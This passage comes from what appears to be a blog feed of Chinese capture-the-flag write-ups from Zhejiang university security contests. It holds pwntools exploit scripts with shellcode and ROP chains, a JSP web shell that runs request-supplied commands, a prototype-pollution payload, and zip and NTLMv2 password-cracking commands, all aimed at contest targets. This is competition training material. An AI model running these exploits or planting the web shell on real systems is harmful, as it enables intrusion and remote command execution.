    data1=((data1&gt;&gt;12)^data)&amp;(mark&gt;&gt;12)        result|=data1        mark=mark&gt;&gt;12    return result    passe=ELF(&quot;./pwn&quot;)#p=process(&quot;./pwn&quot;)p=remote(&#x27;10.1.197.36&#x27;,9999)p.readuntil(b&#x27;gift:\n&#x27;)e.address=int(p.readline(),16)-0x1a44#gdb.attach(p)add(0x400)add(0x400)add(0x400)free(0)free(1)free(2)show(1)d=u64(p.read(8))print(hex(d))d=calc(d)print(hex(d))_4180=e.address+0x4180edit(1,p64(_4180^((d+0x410)&gt;&gt;12)))add(0x400)add(0x400)add(0x400)payload=p32(0xf0)*10edit(5,payload)p.sendline(&#x27;6&#x27;)p.interactive()

printFFF题目允许写入0x15字节的shellcode，但是不够获取shell所以利用exit的got表第二次写shellcode，并在第一次shellcode中设置一些环境这样第二次shellcode就可以直接调用system(&quot;sh&quot;)来获取shell
from pwn import *context.arch=&#x27;amd64&#x27;shellcode=&quot;&quot;&quot;mov edi,0x404800mov eax,0x6873mov [rdi],raxpop rdisub rdi,0x6Djmp rdi&quot;&quot;&quot;shellop=asm(shellcode)print(hex(len(shellop)))#exit()e=ELF(&quot;./pwn&quot;)#p=process(&quot;./pwn&quot;)p=remote(&quot;10.1.197.38&quot;,9999)#gdb.attach(p,&#x27;bp 0x4010E0&#x27;)p.send(shellop)pause()exit_=e.got[&#x27;exit&#x27;]p.send(p64(0x405000)+p64(exit_)+p64(4))p.interactive()shellcode=&quot;&quot;&quot;mov edi,0x404800mov rax,[0x404030]sub rax,0xc3a60jmp rax&quot;&quot;&quot;shellop=asm(shellcode)print(hex(len(shellop)))p.send(shellop)pause()exit_=e.got[&#x27;exit&#x27;]p.send(p64(0x405000)+p64(exit_)+p64(4))pause()p.interactive()


reverse_stack在程序扩展栈空间的时候存在整数溢出，让下一个函数的栈在当前函数的前面，就可以实现修改程序流通过修改程序流让程序第二次使用mmap创建第二个栈这两个栈是连续的，这样在第一次调用函数时写入的栈地址就在程序栈的中间，就可以获取栈中的数据，比如libc_start_main的地址之后就可以构造rop链获取shell
from pwn import *#context.log_level=&#x27;debug&#x27;def l(size):    p.sendafter(&#x27;long?\n&#x27;,p64(size&amp;(0xffffffffffffffff)))def d(data):    p.sendafter(&#x27;buf\n&#x27;,data)def pill(n):    if n:        p.sendafter(&#x27;pill?\n&#x27;,b&#x27;red&#x27;.ljust(8,b&#x27;\x00&#x27;))    else:        p.sendafter(&#x27;pill?\n&#x27;,b&#x27;blue&#x27;.ljust(8,b&#x27;\x00&#x27;))p=remote(&quot;10.1.197.37&quot;,9999)#p=process(&#x27;./pwn&#x27;)e=ELF(&quot;./pwn&quot;)#pause()l(0x40)d(&#x27;asdfadsf&#x27;)pill(1)l(0x400)d(b&#x27;\x87&#x27;)pill(0)l(0x58)d(&#x27;asdfasdf&#x27;)p.read(0x40)d_=u64(p.read(8))d_=u64(p.read(8))print(hex(d_))e.address=d_-0x1233d_=u64(p.read(8))print(hex(d_))stack=d_&amp;(-0x1000)pill(1)for i in range(10):    l(0x400)    d(&#x27;asdfadsf&#x27;)    pill(1)l(-0x400)pill(1)l(0x500)payload=b&#x27;a&#x27;*0x3c8+p64(e.address+0x1050)+p64(stack+0x5000)d(payload)p.readuntil(&#x27;pill?\n&#x27;)p.send(b&#x27;blue&#x27;.ljust(8,b&#x27;\x00&#x27;))for i in range(0x102):    l(0x1f0)    d(&#x27;asd&#x27;)    pill(1)l(-0x400)pill(1)l(0x500)payload=b&#x27;a&#x27;*0x3c8+p64(e.address+0x11CE)+p64(stack-0x78)d(payload)p.readuntil(&#x27;pill?\n&#x27;)p.send(b&#x27;blue&#x27;.ljust(8,b&#x27;\x00&#x27;))p.read(0x70)d_=u64(p.read(8))print(hex(d_))real_stack=d_pill(1)l(-0x400)pill(1)l(0x1f0)d(&#x27;rotwill&#x27;)pill(1)l(0x500)payload=b&#x27;a&#x27;*(0x3c8-33*0x10)+p64(e.address+0x11ce)+p64(real_stack-0x4d0-8)d(payload)p.readuntil(&#x27;pill?\n&#x27;)p.send(b&#x27;blue&#x27;.ljust(8,b&#x27;\x00&#x27;))p.read(0x4d0)d_=u64(p.read(8))print(hex(d_))pause()pill(1)#p.interactive()libc=ELF(&quot;./libc.so.6&quot;)libc.address=d_-0x29d90gadget=libc.address+0xebc81l(-0x400)pill(1)l(0x500)system=libc.sym[&#x27;system&#x27;]rdi=0x000000000002a3e5+libc.addressbin_sh=next(libc.search(b&#x27;/bin/sh\x00&#x27;))ret=rdi+1#gdb.attach(p,&#x27;bp $rebase(0x1228)\nc&#x27;)#pause()payload=b&#x27;a&#x27;*(0x3c8)+p64(ret)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(stack+0x18000)d(payload)p.readuntil(&#x27;pill?\n&#x27;)p.send(b&#x27;&#x27;.ljust(8,b&#x27;\x00&#x27;))p.interactive()


数据安全datasecurity_classify1from string import ascii_lettersimport osphone_prefix = [    734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772,    778, 782, 783, 784, 787, 788, 795, 798, 730, 731, 732, 740, 745, 746, 755,    756, 766, 767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774, 777,    780, 781, 789, 790, 791, 793, 799]id_card_xishu = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]odd = &quot;1 0 X 9 8 7 6 5 4 3 2&quot;.split(&#x27; &#x27;)if os.path.exists(&#x27;result.csv&#x27;):    os.remove(&#x27;result.csv&#x27;)with open(&#x27;result.csv&#x27;,&#x27;+a&#x27;) as result:    result.write(&#x27;类型,数据值\n&#x27;);    with open(&#x27;data.csv&#x27;,&#x27;rb&#x27;) as data:        for line in data.readlines():            line = line.decode().strip();            if len(line) == 18:                # id card                qian_17 = line[:17]                sums = 0;                for i,e in enumerate(qian_17):                    e = int(e) * id_card_xishu[i];                    sums += e;                if line[-1] != odd[sums % 11]:                    continue;                result.write(&#x27;身份证号,&#x27;+line + &#x27;\n&#x27;);            elif len(line) == 11:                for prefix in phone_prefix:                    if line.startswith(str(prefix)):                        result.write(&#x27;手机号,&#x27;+line + &#x27;\n&#x27;);                        break;            else:                if &#x27;数据值&#x27; in line:                    continue;                # name                sign = False;                for i in ascii_letters:                    if i in line:                        sign = True;                        break;                if not sign:                    result.write(&#x27;姓名,&#x27;+line + &#x27;\n&#x27;);



datasecurity_classify2先用tshark提取数据
tshark -r data.pcapng -T felds -Y &quot;http.request.method==POST&quot; -e data

除了文档中的要求外注意处理ip的范围
def veryifyIdCard(idcard):    if len(idcard) != 18:        return False;    idcardList.append(idcard)    idcard = idcard.upper()    id_card_xishu = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]    odd = &quot;1 0 X 9 8 7 6 5 4 3 2&quot;.split(&#x27; &#x27;)    sums = 0;    qian_17 = idcard[:17]    for i,e in enumerate(qian_17):        e = int(e) * id_card_xishu[i];        sums += e;    return idcard[-1] == odd[sums % 11];def verifyPhone(phone):    phone_prefix = [        734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772, 778,        782, 783, 784, 787, 788, 795, 798, 730, 731, 732, 740, 745, 746, 755, 756, 766,        767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774, 777, 780, 781, 789,        790, 791, 793, 799    ]    if len(phone) != 11 or phone[-1] == &#x27;X&#x27;:        return False;    for prefix in phone_prefix:        if phone.startswith(str(prefix)):            return True;    return False;def verifyIp(ip):    for i in ip.split(&#x27;.&#x27;):        if int(i) &gt; 255:            return False;    return True;def cleanData(data):    if &#x27;-&#x27; in data:        data = &#x27;&#x27;.join(data.split(&#x27;-&#x27;))    elif &#x27; &#x27; in data:        data = &#x27;&#x27;.join(data.split(&#x27; &#x27;))    return data;import re,osipMatch = re.compile(r&#x27;[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;&#x27;);phoneMatch = re.compile(&#x27;(\d&#123;11&#125;|\d&#123;3&#125;\ \d&#123;4&#125;\ \d&#123;4&#125;|\d&#123;3&#125;\-\d&#123;4&#125;\-\d&#123;4&#125;)&#x27;);idcardMatch = re.compile(&#x27;(\d&#123;18&#125;|\d&#123;6&#125;\ \d&#123;8&#125;\ \d&#123;4&#125;|\d&#123;6&#125;\-\d&#123;8&#125;\-\d&#123;4&#125;)&#x27;);idcardMatch_with_x = re.compile(&#x27;(\d&#123;17&#125;X|\d&#123;6&#125;\ \d&#123;8&#125;\ \d&#123;3&#125;X|\d&#123;6&#125;\-\d&#123;8&#125;\-\d&#123;3&#125;X)&#x27;);idcardList = []if os.path.exists(&#x27;result2.csv&#x27;):    os.remove(&#x27;result2.csv&#x27;)with open(&#x27;result2.csv&#x27;,&#x27;+a&#x27;) as result:    result.write(&#x27;category,value\n&#x27;);    with open(&#x27;data.dat&#x27;, &#x27;r&#x27;) as data:        data2 = bytes.fromhex(data.read()).decode();        for line in data2.split(&#x27;,&#x27;):            if idcardMatch.findall(line):                for e in idcardMatch.findall(line):                    e = cleanData(e);                    if veryifyIdCard(e):                        result.write(&#x27;idcard,&#x27; + e + &#x27;\n&#x27;);            if idcardMatch_with_x.findall(line):                for e in idcardMatch_with_x.findall(line):                    e = cleanData(e);                    if veryifyIdCard(e):                        result.write(&#x27;idcard,&#x27; + e + &#x27;\n&#x27;);            if phoneMatch.findall(line):                for e in phoneMatch.findall(line):                    e = cleanData(e);                    sign = True;                    for card in idcardList:                        if e in card:                            sign = False;                            break;                    if not sign:                        continue;                    if verifyPhone(e):                        result.write(&#x27;phone,&#x27; + e + &#x27;\n&#x27;);            if ipMatch.findall(line):                for e in ipMatch.findall(line):                    if verifyIp(e):                        result.write(&#x27;ip,&#x27; + e + &#x27;\n&#x27;);


cryptoMyCode根据加密内容生成key并爆破即可
import numpy as npdef substitute(state, sub_box):    return [sub_box[b &amp; 0xF] | (sub_box[(b &gt;&gt; 4) &amp; 0xF] &lt;&lt; 4) for b in state]def generate_round_keys(base_key, rounds):    round_keys = []    temp_key = base_key    for _ in range(rounds):        round_keys.append(temp_key &amp; 0xFFFFFFFF)        temp_key ^= ((temp_key &lt;&lt; 1) &amp; 0xFFFFFFFF) | ((temp_key &gt;&gt; 31) &amp; 0x1)    return round_keysdef process_state(base_key, state, rounds, encrypt):    sub_box = [0x9, 0x4, 0xA, 0xB, 0xD, 0x1, 0x8, 0x5, 0x6, 0x2, 0x0, 0x3, 0xC, 0xE, 0xF, 0x7]    inv_sub_box = [0xA, 0x5, 0x9, 0xB, 0x1, 0x7, 0x8, 0xF, 0x6, 0x0, 0x2, 0x3, 0xC, 0x4, 0xD, 0xE]    round_keys = generate_round_keys(base_key, rounds)    if encrypt:        for round in range(rounds):            state = substitute(state, sub_box)            state = [s ^ ((round_keys[round] &gt;&gt; (i * 8)) &amp; 0xFF) for i, s in enumerate(state)]    else:        for round in range(rounds - 1, -1, -1):            state = [s ^ ((round_keys[round] &gt;&gt; (i * 8)) &amp; 0xFF) for i, s in enumerate(state)]            state = substitute(state, inv_sub_box)    return statedef encrypt(plaintext, key, rounds=10):    length = len(plaintext)    padded_length = length if length % 4 == 0 else length + (4 - (length % 4))    plaintext += b&#x27;\x00&#x27; * (padded_length - length)    ciphertext = bytearray(padded_length)    for i in range(0, padded_length, 4):        state = list(plaintext[i:i + 4])        state = process_state(key, state, rounds, True)        ciphertext[i:i + 4] = state    return ciphertextdef decrypt(ciphertext, key, rounds=10):    length = len(ciphertext)    plaintext = bytearray(length)    for i in range(0, length, 4):        state = list(ciphertext[i:i + 4])        state = process_state(key, state, rounds, False)        plaintext[i:i + 4] = state    return plaintext.rstrip(b&#x27;\x00&#x27;)def main():    # plaintext = b&quot;DASCTF&#123;******&#125;&quot;    # key = 0xECB... # 4 bytes    # ciphertext = encrypt(plaintext, key)    # print(&quot;Ciphertext:&quot;, &#x27;&#x27;.join(f&quot;&#123;b:02X&#125;&quot; for b in ciphertext))    Ciphertext = &#x27;A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401&#x27;    Ciphertext = bytes.fromhex(Ciphertext)    for i in range(0xFFFFF + 1):        key = 0xecb00000 + i        re = decrypt(Ciphertext, key)        print(re)        if b&#x27;DAS&#x27; in re:            breakif __name__ == &quot;__main__&quot;:    main()


信创安全OHapp会在点击事件中对输入进行加密，将加密之后的数据与/aPR+E8wS9+XbFMUfm8NacHpP190pf5xaR8+MIm/8gw=进行比较

程序加密的调用流程为encrypt-&gt;encryptX-&gt;encryptY-&gt;encodeX-&gt;encodeY



分析初始化函数发现，加密使用的密钥相同，为DASCTF2024-OHAPP，encryptX为aes-128|ecb加密，encryptY为aes-128|cbc加密
分析encryptY，发现疑似使用encryptX的结果作为cbc的iv程序将明文从中间分为两个十六位字符串，前十六位进行encryptX加密，后十六位进行encryptY加密



签到网安知识大挑战-FINAL简单的问题，直接做了
DBCCCCBCDB
根据提示用Triple DES解密得到flag

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2024竞赛</tag>
        <tag>浙江</tag>
      </tags>
  </entry>
  <entry>
    <title>第七届浙江省大学生网络与信息安全竞赛预赛-WP</title>
    <url>/posts/42d6129/</url>
    <content><![CDATA[签到网安知识大挑战数据存储在js中

aes解密得到flag

签到题Base92 -&gt; Base85 -&gt; Base64 -&gt; Base62 -&gt; Base58 -&gt; Base45 -&gt; Base32

DASCTF&#123;welcome_to_zjctf_2024&#125;
webhack memory访问/robot.txt得到/upload路径
没有限制，直接上传一个小马
&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c)&#123;    StringBuilder line = new StringBuilder();try&#123;    Process pro = Runtime.getRuntime().exec(c);    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));    String temp = null;    while ((temp = buf.readLine()) != null)    &#123;        line.append(temp+&quot;\\n&quot;);    &#125;    buf.close();&#125;catch (Exception e)&#123;    line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;    out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;    out.println(&quot;:-)&quot;);&#125;%&gt;

flag内容需要再base64一次

easyjsconst express = require(&#x27;express&#x27;);const _ = require(&#x27;lodash&#x27;);const fs = require(&#x27;fs&#x27;);const app = express();app.use(express.json());// 存储笔记的对象const notes = &#123;&#125;;// 创建新笔记app.post(&#x27;/api/notes&#x27;, (req, res) =&gt; &#123;    const noteId = req.body.id;    const noteData = req.body;    if (!noteId) &#123;        return res.status(400).json(&#123; error: &#x27;Missing id&#x27; &#125;);    &#125;    // 使用lodash.merge，该版本存在原型链污染漏洞    notes[noteId] = &#123;&#125;;    _.merge(notes[noteId], noteData);    console.log(&#x27;Note prototype:&#x27;, Object.getPrototypeOf(notes[noteId]));    console.log(&#x27;Note properties:&#x27;, notes[noteId]);    res.json(notes[noteId]);&#125;);// 获取笔记app.get(&#x27;/api/notes/:id&#x27;, (req, res) =&gt; &#123;    const noteId = req.params.id;    if (!notes[noteId]) &#123;        return res.status(404).json(&#123; error: &#x27;Note not found&#x27; &#125;);    &#125;    res.json(notes[noteId]);&#125;);// 获取flag (仅管理员可访问)app.get(&#x27;/api/flag&#x27;, (req, res) =&gt; &#123;    const noteId = req.headers[&#x27;note-id&#x27;];    if (!noteId || !notes[noteId]) &#123;        return res.status(403).json(&#123; error: &#x27;Authentication required&#x27; &#125;);    &#125;    if (!notes[noteId].isAdmin) &#123;        return res.status(403).json(&#123; error: &#x27;Admin access required&#x27; &#125;);    &#125;    try &#123;        const flag = fs.readFileSync(&#x27;/flag&#x27;, &#x27;utf8&#x27;);        res.json(&#123; flag: flag.trim() &#125;);    &#125; catch (err) &#123;        res.status(500).json(&#123; error: &#x27;Error reading flag&#x27; &#125;);    &#125;&#125;);app.listen(8000, () =&gt; &#123;    console.log(&#x27;Server running on port 8000&#x27;);&#125;);

先创建一个笔记，isAdmin设为true
&#123;&quot;id&quot;:1,&quot;isAdmin&quot;:true&#125;


访问/api/flag的时候将note-id设为1即可得到flag

miscRealSignin图片尾数据dEFfc1dGq1pxMgMWnihrMx9mewNgdvIWMvctrc
stegsolve 0通道得到base码表
ABCDEFGHIJKLMNabcdefghijklmnopqrstuvwxyzOPQRSTUVWXYZ0123456789+/
base64换表得到flag

机密文档简单爆破无果，尝试明文攻击
echo -n &quot;the_secret_you_never_ever_know_hahahaha&quot; &gt; plain.out./bkcrack -C 1.zip -c the_secret_you_never_ever_know_hahahaha.zip -p plain.out -o 30 -x 0 504B030414000000./bkcrack -C 1.zip -k b8edf1ff c1f93a7e f93d08e0 -U 2.zip dr0n1


解压后得到一个dom文件，其中有一个名为key的vba宏代码
Sub key()    Dim decValues As Variant    Dim str As String    Dim result As String    Dim i As Integer    Dim xorValue As Integer    decValues = Array(26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3)    str = &quot;outguess&quot;    result = &quot;&quot;    For i = LBound(decValues) To UBound(decValues)        xorValue = decValues(i) Xor Asc(Mid(str, (i Mod Len(str)) + 1, 1))        result = result &amp; Chr(xorValue)    Next iEnd Sub

解密
a=[26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3]b=b&#x27;outguess&#x27;d=[]for i,k in enumerate(a):    d.append(b[i%len(b)]^k)print(bytes(d))

得到key: ulhged98BhgVHYp
根据vba中的outguess提示，对文件中的图片使用outguess解密后得到flag
outguess -k &#39;ulhged98BhgVHYp&#39; -r image1.jpg -t 1.txt
EZtraffic导出SMB对象
导出的压缩包注释中得到NTLM v2 plaintext + \d&#123;5&#125;
那么根据NTLM v2的格式拼接后爆破即可
username::domain:challenge:HMAC-MD5:blob
在流量包中对应的数据如下
User name: rockyouDomain name: MicrosoftAccountServer Challenge: 4936df20962cae6dNTproofStr: db12ced50faf52f141636e80205e8f28NTLMv2 Response: 01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000//HMAC-MD5对应数据包中的NTProofStr//blob对应数据包中Response去掉NTProofStr的后半部分

rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000
使用hashcat爆破
hashcat -m 5600 1.txt rockyou.txt --show

掩码爆破得到haticehatice12580
解压后是100张小图片，使用gaps的效果不好，猜测有地方存储了拼图顺序
发现每张图片的Red 0通道保存有一张二维码

写脚本排序并拼图
from PIL import Imageimport zxingimport osdef process_image_to_qrcode(image_path):    # 读取图片Red 0通道数据    img = Image.open(image_path)    w, h = img.size    rgb = [&#x27;&#x27;]    for j in range(h):        for i in range(w):            data = img.getpixel((i, j))            rgb[0] += str(data[0] % 2)    # 转成二维码    img = Image.new(&#x27;1&#x27;, (w, h))    for j in range(h):        for i in range(w):            img.putpixel((i, j), int(rgb[0][j * w + i]))    img.save(&#x27;./out/&#x27; + image_path.split(&#x27;\\&#x27;)[-1])    # 扫描二维码    reader = zxing.BarCodeReader()    barcode = reader.decode(&#x27;./out/&#x27; + image_path.split(&#x27;\\&#x27;)[-1])    return image_path, barcode.parsedpath = &quot;./final_out&quot;names = []for root, dirs, files in os.walk(path):    for file in files:        names.append(os.path.join(root, file))results = []for name in names:    results.append(process_image_to_qrcode(name))    print(results[-1])# 根据二维码内容排序，将图片合并 10*10results.sort(key=lambda x: int(x[1]))print(results)width_i = 50height_i = 50line_max = 10row_max = 10pic_max = line_max * row_maxtoImage = Image.new(&#x27;RGB&#x27;, (width_i * line_max, height_i * row_max))for i in range(pic_max):    pic_path = results[i][0]    pic_fole_head = Image.open(pic_path)    tmppic = pic_fole_head.resize((width_i, height_i))    loc = (int(i % line_max * width_i), int(i // line_max * height_i))    toImage.paste(tmppic, loc)toImage.save(&#x27;merged.png&#x27;)


pwnshellcodefrom pwn import *context.arch=&#x27;amd64&#x27;shellcode=&quot;&quot;&quot;pop rcxxchg rdi,rdxsub rcx,0x44push rcxret&quot;&quot;&quot;print(len(asm(shellcode)))#exit()#p=process(&quot;./shellcode&quot;)p=remote(&quot;139.155.126.78&quot;,&quot;32343&quot;)#gdb.attach(p,&#x27;bp $rebase(0x1424)\nc&#x27;)pause()p.send(asm(shellcode))pause()shellcode=&quot;&quot;&quot;    mov rcx,rax    add rcx,0x100    mov rbx,0x50f    mov  word ptr [rcx],bx    push 0x68    mov rax, 0x732f2f2f6e69622f    push rax    mov rdi, rsp    push 0x1010101 ^ 0x6873    xor dword ptr [rsp], 0x1010101    xor esi, esi /* 0 */    push rsi /* null terminate */    push 8    pop rsi    add rsi, rsp    push rsi /* &#x27;sh\x00&#x27; */    mov rsi, rsp    xor edx, edx /* 0 */    push 0x3b    pop rax    jmp rcx    &quot;&quot;&quot;p.send(asm(shellcode))p.interactive()

apple存在数组越界可修改stdout的数据，利用io结构体获取shell
from pwn import *context.arch=&#x27;amd64&#x27;def add(ind,size):    p.sendafter(&#x27;choice&#x27;,p32(1))    p.sendafter(b&#x27;index&#x27;,p32(ind&amp;0xffffffff))    p.sendafter(b&#x27;long?&#x27;,p32(size&amp;0xffffffff))    passdef show(ind):    p.sendafter(&#x27;choice&#x27;,p32(3))    p.sendafter(b&#x27;index&#x27;,p32(ind&amp;0xffffffff))    p.readuntil(&#x27;&gt;&gt;&gt;\n&#x27;)    return p.readuntil(&#x27;1.&#x27;,drop=1)def delete(ind):    p.sendafter(&#x27;choice&#x27;,p32(2))    p.sendafter(b&#x27;index&#x27;,p32(ind&amp;0xffffffff))    passdef edit(ind,data):    p.sendafter(&#x27;choice&#x27;,p32(4))    p.sendafter(b&#x27;index&#x27;,p32(ind&amp;0xffffffff))    p.sendafter(b&#x27;&gt;&gt;&gt;&#x27;,data)    passp=process(&#x27;./pwn&#x27;)libc=ELF(&quot;./libc.so.6&quot;)add(0,0x500)add(1,0x500)delete(0)d=u64(show(0).ljust(8,b&#x27;\x00&#x27;))libc.address=d-0x21ace0fake_io_add=libc.sym[&#x27;_IO_2_1_stdout_&#x27;]gadget=libc.address+0xebc88wfile_jump=libc.sym[&#x27;_IO_wfile_jumps&#x27;]obstack_jump=libc.address+0x2173c0gs=fake_io_add+0xe0shelladd=gs+0xe8mprotect=libc.sym[&#x27;mprotect&#x27;]setcontext=libc.sym[&#x27;setcontext&#x27;]shellcode=shellcraft.sh()obstack=fake_io_addcontext=fake_io_add+0xe8shelladd=context+0xe8fake_io=flat(&#123;    0x28: shelladd,    0x38: setcontext,    0x48: [context,1],	0xd8: obstack_jump+0x20,    0xe0: fake_io_add,	&#125;,filler=b&#x27;\x00&#x27;)cont=flat(&#123;	0x68: obstack&amp;(~0xfff), # rdi	0x70: 0x1000, # rsi	0x88: 7, # rdx	0xa0: obstack+0x28, # rsp	0xa8: mprotect, # rcx-&gt;rip	0xe0: obstack	&#125;,filler=b&#x27;\x00&#x27;)payload=fake_io+cont+asm(shellcode)for i in range(13):    add(i+2,0x300)pause()edit(-8,payload)p.interactive()


reverseezRe魔改rc4
class rc4():    def toBytes(self,data):        if type(data)==str:            return data.encode()        elif type(data)==bytes:            return data        else:            raise Exception(&quot;data Type Error&quot;)    def GetKey(self,data):        k=[132, 206, 173, 4, 211, 121, 250, 202, 41, 13, 59, 166, 91, 116, 34, 200, 248, 49, 102, 215, 63, 160, 21, 103, 135, 68, 208, 175, 36, 30, 146, 181, 38, 64, 194, 57, 165, 195, 79, 99, 141, 0, 145, 96, 189, 128, 5, 170, 90, 55, 148, 229, 73, 219, 104, 243, 15, 77, 123, 152, 111, 239, 2, 35, 93, 190, 9, 26, 105, 199, 167, 228, 84, 124, 143, 252, 232, 66, 130, 122, 8, 71, 28, 53, 172, 251, 203, 89, 209, 23, 147, 101, 127, 86, 137, 236, 184, 1, 185, 134, 24, 16, 50, 32, 100, 76, 230, 88, 19, 225, 168, 87, 43, 94, 207, 46, 22, 214, 136, 54, 164, 106, 133, 10, 198, 60, 98, 142, 110, 192, 220, 201, 222, 140, 82, 95, 51, 154, 62, 118, 221, 11, 125, 233, 108, 52, 17, 234, 254, 14, 18, 255, 120, 29, 155, 126, 153, 40, 176, 12, 177, 245, 171, 83, 156, 187, 191, 112, 80, 235, 244, 237, 109, 78, 249, 231, 149, 72, 216, 107, 241, 69, 174, 253, 27, 144, 182, 180, 150, 61, 162, 56, 163, 186, 37, 131, 65, 223, 39, 115, 138, 33, 218, 42, 157, 3, 97, 246, 210, 178, 158, 92, 240, 117, 47, 217, 205, 196, 70, 159, 129, 58, 81, 227, 6, 213, 74, 113, 151, 7, 67, 20, 45, 75, 139, 204, 44, 161, 226, 179, 119, 188, 247, 25, 31, 48, 242, 183, 197, 238, 193, 85, 114, 169, 224, 212]        return k    def Cipher(self,data):        data=self.toBytes(data)        enc=[]        k=self.Key.copy()        n=0        n1=0        tmp=0        key=[]        print(k)        for _ in range(50):            n=(n+1)&amp;0xff            n1=(n1+k[n])&amp;0xff            tmp=k[n]            k[n]=k[n1]            k[n1]=tmp            key.append(k[(k[n]+k[n1])%256])        print(key)        for c,k in zip(data,key):            enc.append(c^k^51)        return bytes(enc)    def __init__(self,key):        key=self.toBytes(key)        self.Key=self.GetKey(key)        self.__Key=key    def SetKey(self,key):        key=self.toBytes(key)        self.Key=self.GetKey(key)        self.__Key=keyimport base64b=base64.b64decode(&quot;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&quot;).decode(&quot;utf-8&quot;)b_=[]for i in b:    b_.append(ord(i))key=b&quot;7e021a7dd49e4bd0837e22129682551b&quot;key_=[]for i in key:    key_.append(i^102)r=rc4(bytes(key_))print(r.Cipher(bytes(b_)))



信创安全sm4rev将文件在linux中运行一遍
发现在/tmp目录下生成了一个随机文件xxx开头的文件夹，里面存放了一个二进制程序
使用find-crypto插件发现是sm4加密，且是ECB模式
注意端序
v17 = list(range(6))v17[0] = 0x01DE4BF77DAD5D82;v17[1] = 0x4F456C06436A9EDC;v17[2] = 0x6584914E6D690D85;v17[3] = 0x2DABC532B0D82242;v17[4] = 0x3E205B8369A8D383;v17[5] = 0xBF353724125EBC3A;for i in v17:    print(i.to_bytes(8, byteorder=&#x27;little&#x27;).hex(),end=&#x27;&#x27;)

密文: 825dad7df74bde01dc9e6a43066c454f850d696d4e9184654222d8b032c5ab2d83d3a869835b203e3abc5e12243735bf
密钥: 0123456789abcdeffedcba9876543210
DASCTF&#123;SM4_is_secure_but_d0nt_t3ll_any0ne!&#125;
数据安全ds-enen附加data.vhd没有内容
foremost分离出一个zip
数字暴力破解得到密码60111106
打开是一个csv表格，个性签名被加密了，看组成猜测是aes，用密码做为key
from Crypto.Cipher import AESimport pandas as pdimport base64data = pd.read_csv(&#x27;data.csv&#x27;)password = data[&#x27;密码&#x27;]signature = data[&#x27;个性签名(加密版)&#x27;]def aes_decrypt(ciphertext, key):    key = key.encode(&#x27;utf-8&#x27;) + (16 - len(key)) * b&#x27;\0&#x27;    ciphertext = base64.b64decode(ciphertext)    cipher = AES.new(key, AES.MODE_ECB)    plaintext = cipher.decrypt(ciphertext)    return plaintextfor i in range(len(password)):    if &#x27;DASCTF&#x27; in aes_decrypt(signature[i], password[i]).decode(&#x27;utf-8&#x27;):        print(aes_decrypt(signature[i], password[i]).decode(&#x27;utf-8&#x27;))        break    else:        continue

DASCTF&#123;dcd85182008e3a2d51b37f9845df3312&#125;
ds-encode与 2024年“羊城杯”粤港澳大湾区网络安全大赛 初赛的数据安全基本一样
区别是数据源给的不一样，这次是mysql数据库的文件
将题目给的文件全部复制到mysql中的data文件中即可，注意数据库版本需要是5.7(ib_logfile中可以看到)

剩下的就很简单了
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2024竞赛</tag>
        <tag>浙江</tag>
      </tags>
  </entry>
  <entry>
    <title>第五届浙江省大学生网络与信息安全竞赛决赛-WP</title>
    <url>/posts/780baaa1/</url>
